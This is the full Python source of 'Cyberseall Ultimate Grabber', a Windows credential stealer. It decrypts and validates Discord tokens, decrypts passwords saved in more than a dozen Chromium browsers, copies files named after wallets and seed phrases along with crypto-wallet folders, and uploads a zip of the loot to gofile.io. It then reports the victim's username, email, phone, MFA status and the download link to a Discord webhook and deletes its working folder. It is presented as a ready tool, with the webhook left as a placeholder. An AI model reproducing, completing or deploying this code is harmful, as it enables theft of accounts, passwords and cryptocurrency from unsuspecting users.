import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.fi()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return "Error"
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            chrome = local + "\\Google\\Chrome\\User Data"
            
            paths = {
                'Discord': roaming + '\\discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Lightcord': roaming + '\\Lightcord',
                'Discord PTB': roaming + '\\discordptb',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
                'Amigo': local + '\\Amigo\\User Data',
                'Torch': local + '\\Torch\\User Data',
                'Kometa': local + '\\Kometa\\User Data',
                'Orbitum': local + '\\Orbitum\\User Data',
                'CentBrowser': local + '\\CentBrowser\\User Data',
                '7Star': local + '\\7Star\\7Star\\User Data',
                'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
                'Chrome': chrome + '\\Default',
                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Iridium': local + '\\Iridium\\User Data\\Default'
            }
            
            for platform, path in paths.items():
                if not os.path.exists(path): 
                    continue
                try:
                    with open(path + f"\\Local State", "r") as file:
                        key = json.loads(file.read())['os_crypt']['encrypted_key']
                        file.close()
                except: 
                    continue
                    
                leveldb_path = path + f"\\Local Storage\\leveldb\\"
                if not os.path.exists(leveldb_path):
                    continue
                    
                for file in os.listdir(leveldb_path):
                    if not file.endswith(".ldb") and not file.endswith(".log"): 
                        continue
                    try:
                        with open(leveldb_path + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: 
                        continue
                        
                for i in tokens:
                    if i.endswith("\\"):
                        i.replace("\\", "")
                    elif i not in cleaned:
                        cleaned.append(i)
                        
                for token in cleaned:
                    try:
                        tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                        if tok != "Error":
                            checker.append(tok)
                    except:
                        continue
                        
                for value in checker:
                    if value not in already_check and len(value) > 50:
                        already_check.append(value)
                        # Validiere Token direkt hier
                        headers = {'Authorization': value, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                            if res.status_code == 200:
                                self.t.append(value)
                        except:
                            pass
            
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in self.t[:10]:  # Validiere bis zu 10 Token
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                if r.status_code == 200:
                    user_data = r.json()
                    
                    # Nitro-Info abrufen
                    has_nitro = False
                    days_left = 0
                    try:
                        nitro_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
                        if nitro_res.status_code == 200:
                            nitro_data = nitro_res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            if has_nitro and len(nitro_data) > 0:
                                from datetime import datetime
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                    except:
                        pass
                    
                    token_info = {
                        'token': token,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'Hidden'),
                        'phone': user_data.get('phone', 'None'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'premium_type': user_data.get('premium_type', 0),
                        'has_nitro': has_nitro,
                        'nitro_days_left': days_left
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            pw_data = []
            
            def get_encryption_key(browser_path):
                """Extrahiert den Verschlüsselungsschlüssel aus Local State"""
                try:
                    local_state_file = os.path.join(browser_path, "Local State")
                    if not os.path.exists(local_state_file):
                        return None
                    
                    with open(local_state_file, "r", encoding="utf-8") as f:
                        local_state_data = json.loads(f.read())
                    
                    # Extrahiere verschlüsselten Schlüssel
                    encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
                    encrypted_key_bytes = base64.b64decode(encrypted_key)
                    
                    # Entferne DPAPI Präfix (erste 5 Bytes: "DPAPI")
                    encrypted_key_bytes = encrypted_key_bytes[5:]
                    
                    # Entschlüssele mit Windows DPAPI
                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key_bytes, None, None, None, 0)[1]
                    return decrypted_key
                    
                except Exception as e:
                    return None
            
            def decrypt_chrome_password(encrypted_password, key):
                """Entschlüsselt Chrome/Chromium Passwörter"""
                try:
                    if not encrypted_password:
                        return ""
                    
                    # Prüfe Verschlüsselungsversion
                    if encrypted_password[:3] == b'v10':
                        # Neue AES-GCM Verschlüsselung (Chrome 80+)
                        nonce = encrypted_password[3:15]  # 12 Bytes Nonce
                        ciphertext = encrypted_password[15:]  # Rest ist verschlüsselter Text
                        
                        # AES-GCM Entschlüsselung
                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        decrypted_password = cipher.decrypt(ciphertext[:-16])  # Entferne Auth-Tag
                        return decrypted_password.decode('utf-8')
                        
                    elif encrypted_password[:3] == b'v11':
                        # Neueste Verschlüsselung (Chrome 100+)
                        nonce = encrypted_password[3:15]
                        ciphertext = encrypted_password[15:]
                        
                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        decrypted_password = cipher.decrypt(ciphertext[:-16])
                        return decrypted_password.decode('utf-8')
                        
                    else:
                        # Alte DPAPI Verschlüsselung (Chrome <80)
                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                        return decrypted_password.decode('utf-8')
                        
                except Exception as e:
                    # Fallback: Versuche direkte DPAPI Entschlüsselung
                    try:
                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                        return decrypted_password.decode('utf-8')
                    except:
                        return "DECRYPTION_FAILED"
            
            def extract_firefox_passwords():
                """Extrahiert Passwörter aus Firefox"""
                firefox_passwords = []
                try:
                    firefox_profile_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
                    if not os.path.exists(firefox_profile_path):
                        return firefox_passwords
                    
                    for profile_folder in os.listdir(firefox_profile_path):
                        profile_path = os.path.join(firefox_profile_path, profile_folder)
                        if not os.path.isdir(profile_path):
                            continue
                        
                        # Suche nach logins.json
                        logins_file = os.path.join(profile_path, "logins.json")
                        if os.path.exists(logins_file):
                            try:
                                with open(logins_file, "r", encoding="utf-8") as f:
                                    logins_data = json.loads(f.read())
                                
                                for login in logins_data.get("logins", []):
                                    hostname = login.get("hostname", "")
                                    username = login.get("encryptedUsername", "")
                                    password = login.get("encryptedPassword", "")
                                    
                                    if hostname and username:
                                        # Firefox Passwörter sind komplex verschlüsselt, zeige als verschlüsselt an
                                        firefox_passwords.append(f"Firefox | {hostname} | {username} | [FIREFOX_ENCRYPTED]")
                            except:
                                continue
                                
                except Exception as e:
                    pass
                
                return firefox_passwords
            
            # Umfassende Browser-Konfiguration für 2025
            browser_configs = [
                # Google Chrome Varianten
                {
                    "name": "Google Chrome",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 2"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 3"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Chrome Canary",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Profile 1"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Chrome Beta",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Chrome Dev",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                # Microsoft Edge Varianten
                {
                    "name": "Microsoft Edge",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Profile 1"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Profile 2"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Edge Beta",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Edge Dev",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Edge Canary",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge SxS", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                # Brave Browser
                {
                    "name": "Brave Browser",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Profile 1"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta", "User Data", "Default"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Dev", "User Data", "Default"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                # Opera Varianten
                {
                    "name": "Opera",
                    "paths": [
                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Next"),
                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Opera GX",
                    "paths": [
                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
                    ],
                    "login_file": "Login Data"
                },
                # Vivaldi
                {
                    "name": "Vivaldi",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Profile 1"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi-Snapshot", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                # Yandex Browser
                {
                    "name": "Yandex Browser",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
                        os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Profile 1"),
                    ],
                    "login_file": "Ya Passman Data"
                },
                # Weitere Chromium-basierte Browser
                {
                    "name": "Chromium",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Arc Browser",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Arc", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Thorium",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "Thorium", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                },
                {
                    "name": "Ungoogled Chromium",
                    "paths": [
                        os.path.join(os.getenv("LOCALAPPDATA"), "ungoogled-chromium", "User Data", "Default"),
                    ],
                    "login_file": "Login Data"
                }
            ]
            
            # Durchsuche alle Browser-Konfigurationen
            for browser_config in browser_configs:
                browser_name = browser_config["name"]
                browser_paths = browser_config["paths"]
                login_file = browser_config["login_file"]
                
                for browser_path in browser_paths:
                    try:
                        # Prüfe ob Browser-Pfad existiert
                        if not os.path.exists(browser_path):
                            continue
                        
                        # Hole Verschlüsselungsschlüssel
                        encryption_key = get_encryption_key(browser_path)
                        if not encryption_key:
                            continue
                        
                        # Pfad zur Login-Datenbank
                        login_db_path = os.path.join(browser_path, login_file)
                        if not os.path.exists(login_db_path):
                            continue
                        
                        # Erstelle temporäre Kopie der Datenbank
                        temp_db_name = f"{browser_name.replace(' ', '_')}_{hash(browser_path)}_{os.getpid()}.db"
                        temp_db_path = os.path.join(os.getenv("TEMP"), temp_db_name)
                        
                        try:
                            shutil.copy2(login_db_path, temp_db_path)
                        except Exception as e:
                            continue
                        
                        # Verbinde zur Datenbank und extrahiere Passwörter
                        try:
                            connection = sqlite3.connect(temp_db_path)
                            cursor = connection.cursor()
                            
                            # Erweiterte SQL-Abfrage für alle möglichen Felder
                            query = """
                            SELECT 
                                origin_url, 
                                action_url, 
                                username_value, 
                                password_value,
                                date_created,
                                date_last_used,
                                times_used
                            FROM logins 
                            WHERE username_value != '' OR password_value != ''
                            ORDER BY date_last_used DESC
                            """
                            
                            cursor.execute(query)
                            login_records = cursor.fetchall()
                            
                            for record in login_records:
                                origin_url = record[0] or "Unknown URL"
                                action_url = record[1] or ""
                                username = record[2] or "No Username"
                                encrypted_password = record[3]
                                date_created = record[4] or 0
                                date_last_used = record[5] or 0
                                times_used = record[6] or 0
                                
                                # Entschlüssele Passwort
                                if encrypted_password:
                                    decrypted_password = decrypt_chrome_password(encrypted_password, encryption_key)
                                else:
                                    decrypted_password = "No Password"
                                
                                # Formatiere Passwort-Eintrag
                                profile_name = os.path.basename(browser_path) if os.path.basename(browser_path) != browser_name else "Default"
                                password_entry = f"{browser_name} ({profile_name}) | {origin_url} | {username} | {decrypted_password}"
                                
                                # Füge zusätzliche Informationen hinzu wenn verfügbar
                                if times_used > 0:
                                    password_entry += f" | Used: {times_used}x"
                                
                                pw_data.append(password_entry)
                            
                            connection.close()
                            
                        except Exception as e:
                            if 'connection' in locals():
                                try:
                                    connection.close()
                                except:
                                    pass
                        
                        # Lösche temporäre Datei
                        try:
                            os.remove(temp_db_path)
                        except:
                            pass
                            
                    except Exception as e:
                        continue
            
            # Füge Firefox Passwörter hinzu
            firefox_passwords = extract_firefox_passwords()
            pw_data.extend(firefox_passwords)
            
            # Speichere alle gefundenen Passwörter
            self.p = pw_data
            
            if pw_data:
                try:
                    with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                        f.write("=" * 60 + "\n")
                        f.write("🔥 CYBERSEALL BROWSER PASSWORD STEALER 2025 🔥\n")
                        f.write("=" * 60 + "\n\n")
                        
                        # Gruppiere Passwörter nach Browser
                        browser_groups = {}
                        for password in pw_data:
                            browser = password.split(" |")[0]
                            if browser not in browser_groups:
                                browser_groups[browser] = []
                            browser_groups[browser].append(password)
                        
                        for browser, passwords in browser_groups.items():
                            f.write(f"\n🌐 {browser.upper()} ({len(passwords)} passwords)\n")
                            f.write("-" * 50 + "\n")
                            for password in passwords:
                                f.write(password + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"📊 TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
                        f.write(f"🔍 BROWSERS SCANNED: {len(browser_groups)}\n")
                        f.write("=" * 60 + "\n")
                        
                except Exception as e:
                    pass
            
        except Exception as e:
            pass

    def fi(self):
        try:
            files_data = []
            
            # Nur die wichtigsten Verzeichnisse durchsuchen
            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        for f in fs[:10]:  # Limit auf 10 Dateien pro Verzeichnis
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')) and os.path.getsize(os.path.join(r,f)) < 1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 10:
                                    break
                        if len(files_data) >= 10:
                            break
                    if len(files_data) >= 10:
                        break
            
            # Nur die wichtigsten Crypto-Wallets für bessere Performance
            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs[:5]:  # Limit auf 5 Dateien pro Wallet
                            if f.lower().endswith(('.wallet','.dat','.key','.json')) and os.path.getsize(os.path.join(r,f)) < 5*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:
            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            zf.write(fp, os.path.relpath(fp, self.d))
            
            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:
            embed = {
                "embeds": [{
                    "title": "🔥 CYBERSEALL ULTIMATE GRABBER v4.2",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": "💎 Results",
                            "value": "```" + str(len(set(self.t))) + " Raw Tokens\n" + str(len(self.vt)) + " Valid Tokens\n" + str(len(self.p)) + " Browser Passwords\n" + str(len(self.f)) + " Keyword Files```"
                        },
                        {
                            "name": "💻 Target",
                            "value": "```" + getpass.getuser() + "@" + os.getenv("COMPUTERNAME", "?") + "```"
                        },
                        {
                            "name": "📁 Download",
                            "value": "[**CLICK HERE TO DOWNLOAD**](" + str(self.link if hasattr(self, 'link') else 'Failed') + ")",
                            "inline": False
                        }
                    ],
                    "footer": {"text": "Cyberseall ULTIMATE Grabber v4.2 - Optimized Token Extraction"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
            # Sende alle validen Token mit Nitro-Info
            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:5]):  # Max 5 Token
                    token_embed = {
                        "embeds": [{
                            "title": "✅ VALID TOKEN #" + str(i+1),
                            "color": 0x00ff00,
                            "fields": [
                                {
                                    "name": "👤 User",
                                    "value": "```" + token_info.get('username', '?') + "#" + token_info.get('discriminator', '?') + "```"
                                },
                                {
                                    "name": "📧 Email",
                                    "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
                                },
                                {
                                    "name": "📱 Phone",
                                    "value": "```" + str(token_info.get('phone', 'None')) + "```"
                                },
                                {
                                    "name": "💎 Nitro",
                                    "value": "```Has Nitro: " + str(token_info.get('has_nitro', False)) + "\nDays Left: " + str(token_info.get('nitro_days_left', 0)) + "```"
                                },
                                {
                                    "name": "🔐 Token",
                                    "value": "```" + token_info['token'][:50] + "...```"
                                },
                                {
                                    "name": "🛡️ Security",
                                    "value": "```MFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "\nPremium: " + str(token_info.get('premium_type', 0)) + "```"
                                }
                            ],
                            "footer": {"text": "Valid Token Info with Nitro"},
                            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                        }]
                    }
                    requests.post(self.w, json=token_embed, timeout=5)
        except:
            pass

    def cleanup(self):
        try:
            time.sleep(1)
            if os.path.exists(self.d):
                shutil.rmtree(self.d, ignore_errors=True)
        except:
            pass

# WEBHOOK_PLACEHOLDER wird durch die Mini-Payload ersetzt
if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
